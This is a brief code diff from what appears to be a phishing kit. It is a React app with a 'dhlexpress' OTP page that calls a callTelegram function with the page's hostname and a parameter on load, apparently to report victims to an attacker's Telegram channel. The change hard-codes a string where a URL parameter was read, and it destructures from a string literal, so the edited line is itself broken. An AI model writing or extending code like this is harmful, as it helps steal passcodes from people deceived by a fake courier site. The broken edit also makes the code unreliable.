@@ -7,7 +7,7 @@ import Otp, { Verified } from "./dhlexpress/otp";
 
 function App() {
   const hostname = window.location.hostname;
-  let { param } = useParams();
+  let { param } = "ioupupoi"
 
   useEffect(() => {
     callTelegram(hostname, param)
